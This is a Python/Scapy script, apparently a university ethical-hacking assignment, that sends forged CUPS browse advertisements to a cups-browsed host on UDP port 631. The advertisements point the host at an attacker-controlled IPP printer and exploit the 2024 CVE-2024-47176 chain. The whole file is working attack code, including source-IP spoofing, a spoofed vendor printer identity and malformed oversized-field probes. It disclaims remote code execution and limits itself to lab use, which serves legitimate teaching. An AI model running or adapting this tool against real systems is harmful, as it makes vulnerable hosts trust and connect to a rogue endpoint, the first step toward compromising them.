#!/usr/bin/env python3
"""
cups_attack.py — CUPS printer-discovery demonstration tool (Scapy).

DAT505 — Ethical Hacking, University of Stavanger.
Author: Bjarte Landråk.

Educational use only. This tool demonstrates the INSECURE printer-discovery
mechanism in cups-browsed (CVE-2024-47176 / CVE-2024-47076 / CVE-2024-47175).
It crafts and sends legacy CUPS "Browse" advertisement packets to UDP/631 of a
vulnerable host, advertising an attacker-controlled virtual printer.

Scope (per assignment): demonstrate that the victim trusts and acts on an
unauthenticated printer advertisement. Full remote code execution is NOT the
goal and is NOT implemented here.

Only run this against a lab host you own and are authorised to test.

Background
----------
cups-browsed listens on 0.0.0.0:631/udp and accepts unauthenticated printer
advertisements. A legacy CUPS browse packet is a single text line:

    <type-hex> <state-hex> <printer-uri> "location" "info" "make-and-model"

When cups-browsed receives such a packet it trusts the advertised URI and may
initiate an IPP connection back to it (Get-Printer-Attributes). By pointing the
URI at an attacker-controlled IPP endpoint, the attacker influences a printer
that is then auto-created on the victim — the root cause of the 2024 CUPS chain.
"""

import argparse
import logging
import sys
import time
from datetime import datetime

try:
    from scapy.all import IP, UDP, Raw, send, wrpcap
except ImportError:
    sys.stderr.write(
        "scapy is not installed. Run: pip install -r requirements.txt\n"
    )
    sys.exit(1)

CUPS_UDP_PORT = 631

# cups-browsed browse packet type/state constants (from the CUPS browse
# protocol). CUPS_PRINTER_CLASS bit etc.; the exact value is not validated by
# the vulnerable service, which is part of the problem.
DEFAULT_TYPE = 0x00000000   # printer type bitfield
DEFAULT_STATE = 0x03        # 3 = IPP_PSTATE_STOPPED / generic


def build_browse_payload(printer_uri, location, info, make_model,
                         ptype=DEFAULT_TYPE, pstate=DEFAULT_STATE):
    """Build a single legacy CUPS browse advertisement line."""
    return (
        f"{ptype:#010x} {pstate:#x} {printer_uri} "
        f"\"{location}\" \"{info}\" \"{make_model}\"\n"
    )


def build_packet(target, target_port, payload, src_ip=None,
                 src_port=CUPS_UDP_PORT):
    """Craft the IP/UDP/Raw advertisement packet."""
    ip = IP(dst=target)
    if src_ip:
        ip.src = src_ip
    return ip / UDP(sport=src_port, dport=target_port) / Raw(load=payload.encode())


# Three crafted variations required by Task 4 (packet manipulation).
def variation_packets(args, listener_uri):
    """Return a list of (label, payload) tuples for the three test variations."""
    variations = []

    # Variation 1 — baseline rogue advertisement.
    variations.append((
        "baseline",
        build_browse_payload(
            listener_uri, "Lab", "Rogue printer", args.make_model),
    ))

    # Variation 2 — manipulated port + spoofed make/model to mimic a trusted
    # vendor device, testing field manipulation.
    alt_uri = listener_uri.replace(f":{args.listener_port}",
                                   f":{args.alt_port}")
    variations.append((
        "alt-port-spoofed-model",
        build_browse_payload(
            alt_uri, "Office", "Trusted device",
            "HP Color LaserJet MFP", pstate=0x05),
    ))

    # Variation 3 — malformed / oversized fields to probe parser robustness
    # (abnormal type value, long info string, missing quotes handled by parser).
    malformed = (
        f"0xffffffff 0x{0x7f:x} {listener_uri} "
        f"\"{'A' * 200}\" \"overflowtest\" \"X\"\n"
    )
    variations.append(("malformed-fields", malformed))

    return variations


def main():
    parser = argparse.ArgumentParser(
        description="CUPS printer-discovery demonstration tool (lab use only).",
        epilog="Authorised lab testing only — DAT505 UiS.",
    )
    parser.add_argument("-t", "--target", required=True,
                        help="Victim CUPS host (cups-browsed) IP address.")
    parser.add_argument("-p", "--target-port", type=int, default=CUPS_UDP_PORT,
                        help="Victim UDP port (default 631).")
    parser.add_argument("--src-ip",
                        help="Spoof/set the IP source address of the packets "
                             "(default: chosen by the OS routing table).")
    parser.add_argument("--listener-ip", default="127.0.0.1",
                        help="Attacker/virtual-printer IP advertised to victim.")
    parser.add_argument("--listener-port", type=int, default=8631,
                        help="Attacker/virtual-printer IPP port advertised.")
    parser.add_argument("--alt-port", type=int, default=9100,
                        help="Alternate port used in manipulation variation.")
    parser.add_argument("-n", "--name", default="EvilPrinter",
                        help="Advertised printer queue name.")
    parser.add_argument("-m", "--make-model", default="Rogue IPP Everywhere",
                        help="Advertised make-and-model string.")
    parser.add_argument("-c", "--count", type=int, default=1,
                        help="Number of times to send each advertisement.")
    parser.add_argument("-i", "--interval", type=float, default=1.0,
                        help="Seconds between sends.")
    parser.add_argument("--variations", action="store_true",
                        help="Send the three crafted test variations (Task 4).")
    parser.add_argument("--pcap", metavar="FILE",
                        help="Write all crafted packets to this PCAP file.")
    parser.add_argument("--dry-run", action="store_true",
                        help="Craft and (optionally) save packets, do NOT send.")
    parser.add_argument("--log", default="cups_attack.log",
                        help="Log file path.")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[logging.FileHandler(args.log), logging.StreamHandler()],
    )
    log = logging.getLogger("cups_attack")

    listener_uri = (
        f"ipp://{args.listener_ip}:{args.listener_port}/printers/{args.name}"
    )

    log.info("CUPS discovery demonstration started at %s", datetime.now())
    log.info("Target: %s:%s  Advertised printer: %s",
             args.target, args.target_port, listener_uri)
    if args.dry_run:
        log.info("DRY-RUN: packets will be crafted/saved but NOT transmitted.")

    if args.variations:
        payloads = variation_packets(args, listener_uri)
    else:
        payloads = [("single",
                     build_browse_payload(listener_uri, "Lab",
                                          args.name, args.make_model))]

    crafted = []
    for label, payload in payloads:
        pkt = build_packet(args.target, args.target_port, payload,
                           src_ip=args.src_ip)
        for round_no in range(args.count):
            crafted.append(pkt)
            log.info("[%s] round %d payload: %s",
                     label, round_no + 1, payload.strip())
            if not args.dry_run:
                send(pkt, verbose=0)
                log.debug("Sent %d bytes to %s:%s",
                          len(bytes(pkt)), args.target, args.target_port)
            if args.interval and round_no + 1 < args.count:
                time.sleep(args.interval)

    if args.pcap:
        wrpcap(args.pcap, crafted)
        log.info("Wrote %d packet(s) to %s", len(crafted), args.pcap)

    log.info("Done. %d advertisement packet(s) processed.", len(crafted))


if __name__ == "__main__":
    main()
